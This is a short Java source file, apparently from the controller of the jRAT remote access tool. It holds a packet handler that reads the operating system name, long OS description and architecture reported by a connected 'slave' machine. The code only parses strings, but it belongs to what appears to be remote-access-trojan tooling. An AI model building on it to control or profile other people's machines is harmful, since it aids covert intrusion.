package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;


public class Packet16InitOperatingSystem extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		slave.setOperatingSystem(slave.readLine());
		slave.setLongOperatingSystem(slave.readLine());
		slave.setArch(slave.readLine());
	}

}
